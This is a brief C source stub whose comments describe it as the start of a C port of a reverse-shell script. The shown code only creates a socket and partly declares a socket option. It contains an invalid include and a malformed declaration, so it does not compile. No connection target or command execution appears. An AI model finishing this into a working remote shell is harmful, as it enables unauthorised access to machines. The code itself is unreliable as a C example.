//This is going to be a C implementation of reverseShell.py.
// Having the lower-level capabilites of C might be useful in the future, and 
// ideally it will help with some of the issues we're having with running commands.

#include <sys>

//Create the socket.
int sockfd = socket(AF_INET, SOCK_STREAM, 0);

int setsockopt(int sockfd, int level)

